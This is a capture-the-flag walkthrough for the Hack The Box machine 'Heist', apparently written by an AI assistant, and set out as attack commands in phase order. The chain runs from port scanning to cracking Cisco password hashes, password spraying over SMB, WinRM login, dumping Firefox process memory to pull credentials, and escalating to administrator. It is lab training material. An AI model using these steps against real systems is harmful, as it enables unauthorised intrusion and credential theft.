Here’s a structured, walkthrough-style command note for **HTB: Heist**, organized by attack phase:

---

# 🧠 HTB: Heist – Walkthrough

## ⚙️ Recon

**Nmap Scan**
```bash
nmap -p- --min-rate 10000 -oA nmap-alltcp 10.10.10.149
```
- Port 80: HTTP Web Portal

---

## 🌐 [Web Enumeration](HTTP)

**Browse Web Portal**
- Navigate to: `http://10.10.10.149`
- Found a **Guest login** → displayed usernames and an **attachment** with Cisco password hashes.

---

## 🔓 Cracking Hashes

### 🧩 Type 5 Hash
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 🧩 Type 7 Hash
Use online Cisco Type 7 decoder (e.g. https://insecure.org/sploits/cisco.password.decoder.html)

---

## 👤 User Enumeration

**RID Brute Force with [CrackMapExec](SMB.md)**
```bash
crackmapexec smb 10.10.10.149 --rid-brute
```

**Password Spray**
```bash
crackmapexec smb 10.10.10.149 -u usernames.txt -p crackedpass
```

---

## 🔐 Gaining Remote Access

**Connect via Evil-WinRM or WinRM manually**
```bash
evil-winrm -i 10.10.10.149 -u ch4rl3s -p [cracked_password]
```

🎉 Found `user.txt` in `C:\Users\ch4rl3s\Desktop`

---

## 🕵️ Investigating the System

**Check files**
```powershell
Get-ChildItem -Path C:\Users\ch4rl3s\Documents\
type C:\Users\ch4rl3s\Documents\todo.txt
```

**Enumerate Processes**
```powershell
Get-Process | where { $_.Path -like "*firefox*" }
```

---

## 📦 Dumping and Analyzing Firefox Memory

**Dump Process Memory**
```powershell
procdump64.exe -ma firefox_pid firefox.dmp
```

**Transfer to attacker machine**
- Use SMB or upload via Evil-WinRM.

**Analyze Memory**
```bash
strings firefox.dmp | grep -i password
```
🎯 Recovered admin credentials!

---

## 🚀 Escalating to Administrator

**Reuse credentials with Evil-WinRM**
```bash
evil-winrm -i 10.10.10.149 -u administrator -p [discovered_password]
```

🎉 Grab `root.txt` from `C:\Users\Administrator\Desktop\`

---

## ✅ Conclusion

- Web app led to leaked Cisco hashes
- Cracking hashes enabled password spray
- Dumped Firefox process memory to recover admin creds
- Completed full escalation path!